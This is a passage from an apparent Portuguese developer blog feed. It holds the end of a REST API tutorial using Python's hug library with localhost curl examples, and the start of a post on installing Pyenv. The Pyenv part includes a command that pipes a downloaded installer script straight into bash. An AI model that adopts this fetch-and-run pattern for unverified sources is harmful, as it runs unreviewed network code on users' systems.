Server: WSGIServer/0.2 CPython/3.4.4
content-type: application/json
content-length: &lt;span class="m"&gt;221&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;A computer hacker learns from mysterious rebels about the true nature of his reality and his role in the war against its controllers.&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;The Matrix&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;DED621D5-08F4-4D32-ADFA-84375BA415B9&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Adicionando&lt;/h3&gt;
&lt;p&gt;Outro verbo bem conhecido do protocolo é o &lt;em&gt;POST&lt;/em&gt;. Quem aqui nunca submeteu um formulário &lt;em&gt;web&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;O princípio desse método é o envio de dados, do cliente para o servidor. Vamos aproveitar dessa sua
natureza para adicionar o filme "Swordish" à nossa &lt;em&gt;API&lt;/em&gt;. Para isso, precisamos alterar nossa função &lt;code&gt;movies&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hug&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;uuid&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;falcon&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HTTP_201&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="nd"&gt;@hug.get_post&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;movies&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;objects&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
  &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  &lt;span class="c1"&gt;# We are assuming it&amp;#39;s a POST&lt;/span&gt;
    &lt;span class="n"&gt;movie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;uuid&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;uuid&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uuid4&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
      &lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_201&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;movie&lt;/span&gt;

&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como é possível reparar no código acima, pretendemos adicionar um filme e o destino da nossa requisição
será o &lt;code&gt;/movies/&lt;/code&gt;. Desse modo, o &lt;em&gt;GET&lt;/em&gt; lista e o &lt;em&gt;POST&lt;/em&gt; adiciona novos filmes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -i -XPOST -d &lt;span class="s2"&gt;&amp;quot;title=Swordfish&amp;amp;description=Some hackish description...&amp;quot;&lt;/span&gt; http://localhost:8000/movies

HTTP/1.0 &lt;span class="m"&gt;201&lt;/span&gt; Created
Date: Fri, &lt;span class="m"&gt;13&lt;/span&gt; May &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:51:43 GMT
Server: WSGIServer/0.2 CPython/3.4.4
content-type: application/json
content-length: &lt;span class="m"&gt;116&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Swordfish&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;uuid&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;a96e7212-6a29-478a-a24e-07720a286944&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Some hackish description...&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora temos dois filmes cadastrados na nossa API:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
   &lt;span class="nt"&gt;&amp;quot;objects&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
         &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;A computer hacker learns from mysterious rebels about the true nature of his reality and his role in the war against its controllers.&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
         &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;The Matrix&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
         &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;DED621D5-08F4-4D32-ADFA-84375BA415B9&amp;quot;&lt;/span&gt;
      &lt;span class="p"&gt;},&lt;/span&gt;
      &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Some hackish description...&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Swordfish&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;a96e7212-6a29-478a-a24e-07720a286944&amp;quot;&lt;/span&gt;
      &lt;span class="p"&gt;}&lt;/span&gt;
   &lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Atualizando e removendo&lt;/h3&gt;
&lt;p&gt;Uma vez que &lt;em&gt;POST&lt;/em&gt; e &lt;em&gt;GET&lt;/em&gt; acontecem no &lt;em&gt;endpoint&lt;/em&gt; responsável por "listar" os nossos filmes,
é natural assumirmos que o &lt;em&gt;PUT&lt;/em&gt; e &lt;em&gt;DELETE&lt;/em&gt; acontecerão no &lt;em&gt;endpoint&lt;/em&gt; responsável por
"detalhar" determinado filme.&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;PUT&lt;/em&gt; é o método &lt;em&gt;HTTP&lt;/em&gt; responsável por atualizar um determinado recurso. Assim como o &lt;em&gt;POST&lt;/em&gt;,
ele permite a passagem de parâmetros que podem ser interpretados como "campos".&lt;/p&gt;
&lt;p&gt;Já o &lt;em&gt;DELETE&lt;/em&gt;, como o nome sugere, é o método padrão quando insinuamos a remoção de um determinado
recurso à nossa &lt;em&gt;API&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Na prática, para suportar esses dois verbos, nossa função &lt;code&gt;movie&lt;/code&gt; ficará assim:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nd"&gt;@hug.http&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/movies/{movie_id}/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;get&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;put&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;movie&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;movie_id&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
  &lt;span class="n"&gt;movie_ids&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;map&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;lambda&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;movie_id&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;movie_ids&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HTTP_404&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Not found&amp;#39;&lt;/span&gt;

  &lt;span class="n"&gt;movie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;movie_ids&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;index&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;movie_id&lt;/span&gt;&lt;span class="p"&gt;)]&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;DELETE&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;MOVIES&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;remove&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Deleted&amp;#39;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;PUT&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get_param&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;movie&lt;/span&gt;

  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;movie&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Agora podemos atualizar o filme "Swordfish":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -i -XPUT -d &lt;span class="s2"&gt;&amp;quot;title=A Senha&amp;amp;description=Um filme sobre Hackers&amp;quot;&lt;/span&gt; http://localhost:8000/movies/a96e7212-6a29-478a-a24e-07720a286944/

HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Fri, &lt;span class="m"&gt;13&lt;/span&gt; May &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:25:42 GMT
Server: WSGIServer/0.2 CPython/3.4.4
content-type: application/json
content-length: &lt;span class="m"&gt;107&lt;/span&gt;

&lt;span class="o"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;A Senha&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;a96e7212-6a29-478a-a24e-07720a286944&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;Um filme sobre Hackers&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E até mesmo apagá-lo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -i -XDELETE http://localhost:8000/movies/a96e7212-6a29-478a-a24e-07720a286944/

HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Fri, &lt;span class="m"&gt;13&lt;/span&gt; May &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:26:52 GMT
Server: WSGIServer/0.2 CPython/3.4.4
content-type: application/json
content-length: &lt;span class="m"&gt;9&lt;/span&gt;

&lt;span class="s2"&gt;&amp;quot;Deleted&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E com isso fechamos as operações de &lt;em&gt;CRUD&lt;/em&gt; através dos métodos &lt;em&gt;POST&lt;/em&gt;, &lt;em&gt;GET&lt;/em&gt;, &lt;em&gt;PUT&lt;/em&gt; e &lt;em&gt;DELETE&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Ser JSON, ou não ser...&lt;/h2&gt;
&lt;p&gt;Uma das premissas do &lt;em&gt;REST&lt;/em&gt; é que um recurso possa ser apresentado de diferentes maneiras.
Por exemplo, o nosso filme se acessado pelo navegador, poderia ser representado através de
um &lt;em&gt;HTML&lt;/em&gt;. Por outro lado, se ele fosse acessado por uma requisição &lt;em&gt;Ajax&lt;/em&gt;, ele poderia
ser representado por um &lt;em&gt;JSON&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Uma terceira modalidade de entrega poderia ser em &lt;em&gt;XML&lt;/em&gt;, ou em qualquer formato
que tanto cliente quanto fornecedor entendam. Esse "acordo" entre as partes é realizado
através do cabeçalho de requisição &lt;code&gt;Accept&lt;/code&gt;, e pelo cabeçalho de resposta &lt;code&gt;content-type&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -v -H &lt;span class="s2"&gt;&amp;quot;Accept: application/json&amp;quot;&lt;/span&gt; http://localhost:8000/movies/DED621D5-08F4-4D32-ADFA-84375BA415B9/

GET /movies/DED621D5-08F4-4D32-ADFA-84375BA415B9/ HTTP/1.1
Host: localhost:8000
User-Agent: curl/7.43.0
Accept: application/json

HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Date: Fri, &lt;span class="m"&gt;13&lt;/span&gt; May &lt;span class="m"&gt;2016&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:41:07 GMT
Server: WSGIServer/0.2 CPython/3.4.4
content-length: &lt;span class="m"&gt;221&lt;/span&gt;
content-type: application/json
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com isso, permitimos que tanto cliente quanto fornecedor conversem livremente,
desde que em um mesmo dialeto. Embora não haja um padrão formal, é comum vermos
&lt;em&gt;APIs&lt;/em&gt; dando suporte a renderizações em &lt;em&gt;JSON&lt;/em&gt; e &lt;em&gt;XML&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Isso pode parecer até um exagero, e uma complexidade questionável na sua aplicação.
A boa notícia é que a maioria das bibliotecas &lt;em&gt;REST&lt;/em&gt; dão suporte &lt;em&gt;built-in&lt;/em&gt; a essa
funcionalidade.&lt;/p&gt;
&lt;h2&gt;Stateless&lt;/h2&gt;
&lt;p&gt;Uma das premissas do &lt;em&gt;REST&lt;/em&gt; é a comunicação sem estados. Isso significa que,
assim como o próprio &lt;a href="https://klauslaube.com.br/2012/04/05/entendendo-os-cookies-e-sessoes.html" title="Leia mais sobre stateless, Cookies e Sessions"&gt;protocolo &lt;em&gt;HTTP&lt;/em&gt;&lt;/a&gt;,
não "conserva-se informações" entre as requisições.&lt;/p&gt;
&lt;p&gt;Na prática, isso significa que cliente pode enviar múltiplas requisições
para o servidor, no entanto, cada uma delas deve ser independente. Cada uma
deve possuir toda a informação necessária para que o servidor possa interpretá-las
completamente (e separadamente).&lt;/p&gt;
&lt;p&gt;Isso facilita o &lt;a href="https://klauslaube.com.br/2012/05/14/o-cache-e-o-http.html" title="O Cache e o HTTP"&gt;&lt;em&gt;caching&lt;/em&gt;&lt;/a&gt; e
escalabilidade da sua solução.&lt;/p&gt;
&lt;p&gt;Caso estados precisem ser armazenados, é uma responsabilidade do cliente fazê-los.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Chegamos ao fim desse artigo, e uma pergunta fica: Mas o que é &lt;em&gt;RESTful&lt;/em&gt;?&lt;/p&gt;
&lt;p&gt;Uma &lt;em&gt;API RESTful&lt;/em&gt; na verdade é uma &lt;em&gt;API&lt;/em&gt; que segue os princípios do &lt;em&gt;REST&lt;/em&gt; de
forma mais "fiel". Enquadrando-se plenamente nas seguintes regras:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Cliente/servidor&lt;/li&gt;
&lt;li&gt;&lt;em&gt;Stateless&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;Cacheável&lt;/li&gt;
&lt;li&gt;Interface uniforme para comunicação entre o cliente e o servidor&lt;/li&gt;
&lt;li&gt;Uso de camadas (facilitando escalabilidade, confiabilidade e segurança)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;No fim das contas, sendo &lt;em&gt;REST&lt;/em&gt; ou &lt;em&gt;RESTful&lt;/em&gt;, utilizar os conceitos
é uma boa forma de criar serviços (de baixo custo) para as suas aplicações,
que podem ser aplicados, por exemplo, dentro de uma arquitetura de microserviços.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.hug.rest/website/quickstart"&gt;&lt;em&gt;Hug - Embrace APIs from the future&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://imasters.expert/rest-architecture-model-definition-constraints-benefits/"&gt;&lt;em&gt;iMasters - REST Architecture Model: Definition, Constraints and Benefits&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.infoq.com/br/articles/rest-introduction"&gt;&lt;em&gt;InfoQ - REST Introduction&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/HATEOAS"&gt;&lt;em&gt;Wikipedia - HATEOAS&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/Hiperm%C3%ADdia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; - Hipermídia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/Hipertexto"&gt;&lt;em&gt;Wikipedia&lt;/em&gt; - Hipertexto&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://pt.wikipedia.org/wiki/URI"&gt;&lt;em&gt;Wikipedia - URI&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="rest"></category><category term="microservices"></category><category term="apis"></category></entry><entry><title>O simples e poderoso Pyenv</title><link href="https://klauslaube.com.br/2016/04/26/o-simples-e-poderoso-pyenv.html" rel="alternate"></link><published>2016-04-26T09:53:00-03:00</published><updated>2016-04-26T09:53:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2016-04-26:/2016/04/26/o-simples-e-poderoso-pyenv.html</id><summary type="html">&lt;p&gt;Num certo dia, eu resolvi deixar a preguiça de lado e atualizar
a versão do &lt;em&gt;Mac OS X&lt;/em&gt; para o &lt;em&gt;El Capitan&lt;/em&gt;. Na cara e coragem,
e dotado de uma ingenuidade ímpar, simplesmente apertei o botão
&lt;em&gt;Update&lt;/em&gt; e deixei com que os deuses resolvessem qual seria o
destino do meu …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Num certo dia, eu resolvi deixar a preguiça de lado e atualizar
a versão do &lt;em&gt;Mac OS X&lt;/em&gt; para o &lt;em&gt;El Capitan&lt;/em&gt;. Na cara e coragem,
e dotado de uma ingenuidade ímpar, simplesmente apertei o botão
&lt;em&gt;Update&lt;/em&gt; e deixei com que os deuses resolvessem qual seria o
destino do meu &lt;em&gt;workspace&lt;/em&gt; após essa fatídica operação.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Obviamente, &lt;a href="https://ohthehugemanatee.org/blog/2015/10/01/how-i-got-el-capitain-working-with-my-developer-tools/" title="Veja o que fazer com se o update do El Capitan quebrar o seu ambiente de desenvolvimento"&gt;algumas ferramentas deixaram de funcionar&lt;/a&gt;,
incluindo a minha instalação "system wide" do &lt;a href="https://klauslaube.com.br/tag/pip.html" title="Leia mais sobre pip"&gt;&lt;em&gt;pip&lt;/em&gt;&lt;/a&gt;
e o meu &lt;a href="https://klauslaube.com.br/tag/virtualenvwrapper.html" title="Leia mais sobre Virtualenv"&gt;&lt;em&gt;virtualenvwrapper&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Após algum tempo "googlando" eu encontrei o &lt;a href="https://github.com/yyuu/pyenv" title="Conheça o Pyenv"&gt;&lt;em&gt;Pyenv&lt;/em&gt;&lt;/a&gt;,
e vou compartilhar com você a razão pela qual ele é uma excelente ideia.&lt;/p&gt;
&lt;h2&gt;Múltiplas versões de Python, sem dor de cabeça&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Pyenv&lt;/em&gt; é uma ferramenta que te permite selecionar qual a versão
do &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; você está utilizando,
de maneira muito fácil e prática.&lt;/p&gt;
&lt;p&gt;Antes de conhecer o &lt;em&gt;Pyenv&lt;/em&gt;, eu geralmente baixava o código fonte e
compilava as versões "adicionais" do &lt;em&gt;Python&lt;/em&gt; (2.6, 3.3, 3.4, etc)
no &lt;code&gt;/opt/&lt;/code&gt; da minha máquina, utilizando a versão do sistema (2.7.x)
para a maioria dos projetos que desenvolvia. Aí no momento de criação
do meu &lt;code&gt;virtualenv&lt;/code&gt;, apontava o executável da linguagem para a versão
específica.&lt;/p&gt;
&lt;p&gt;Com essa ferramenta eu deixo uma versão do sistema intacta, e utilizo
de forma completamente isolada a determinada versão do &lt;em&gt;Python&lt;/em&gt; do
qual necessito, com alguns atalhos que me auxiliam na transição de
uma versão para a outra.&lt;/p&gt;
&lt;h2&gt;Instalando&lt;/h2&gt;
&lt;p&gt;Instalar o &lt;em&gt;Pyenv&lt;/em&gt; é tão trivial quanto dar um &lt;code&gt;pip install&lt;/code&gt;. Por ele não
depender do &lt;em&gt;Python&lt;/em&gt; (e ser em &lt;em&gt;shell&lt;/em&gt; puro) podemos utilizar o seu
&lt;a href="https://github.com/yyuu/pyenv-installer" title="Veja no Github"&gt;instalador de linha de comando&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -L https://raw.githubusercontent.com/yyuu/pyenv-installer/master/bin/pyenv-installer &lt;span class="p"&gt;|&lt;/span&gt; bash
$ pyenv update
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Com o comando &lt;code&gt;pyenv install -l&lt;/code&gt; somos apresentados a uma lista de possíveis versões
a serem instaladas através do utilitário (indo de &lt;em&gt;Python 2.1&lt;/em&gt; até &lt;em&gt;PyPy&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;Suponha que você queira instalar a versão 3.5.1 da linguagem:&lt;/p&gt;
